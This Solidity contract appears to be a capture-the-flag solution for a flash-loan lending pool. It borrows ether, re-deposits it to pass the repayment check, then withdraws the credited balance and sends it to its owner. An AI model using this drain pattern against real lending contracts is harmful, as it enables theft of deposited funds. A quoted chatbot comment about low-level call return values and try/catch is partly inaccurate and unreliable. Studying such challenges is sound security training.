// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract FaultyContract is IFlashLoanEtherReceiver {
    // SideEntranceLenderPool could have an interface of it.
    SideEntranceLenderPool public pool;
    address public owner;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
        owner = msg.sender;
    }

    function firstTimer(uint256 _amount) external {
        pool.flashLoan(_amount);
        // withdraw will run after below "execute()" and "SideEntranceLenderPool's flashLoan()"
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
        // need to withdraw after repay check successfull in SideEntranceLenderPool's flashLoan
        // pool.withdraw(); -> cannot be here due to the above reason
    }

    /**
     * @dev while dealing with money always add the below code for safety
     */
    receive() external payable {
        /**
         * @dev
         *      1) when written without "(bool success,) =", was giving me error as below :
         *      ** Return value of low-level calls not used. **
         *      chatgpt ->
         * In Solidity, when you use a low-level call like owner.call{value: address(this).balance}(""), the return value of the call is often ignored intentionally. This is because handling the return value of a low-level call can be complex and error-prone, especially if the target contract's function being called has a return value.
         *
         * However, Solidity compilers often issue a warning when the return value of such calls is ignored to alert developers that they might be missing important information. The warning message "Return value of low-level calls not used" is an indication that although the call was made, its result was not explicitly checked or utilized in the contract code.
         *
         * To handle the return value properly, you might consider using the try/catch mechanism introduced in Solidity 0.6.8 to catch any errors that might occur during the execution of the call. Here's an example of how you could use try/catch to handle errors and inspect the return value:
         */
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
}
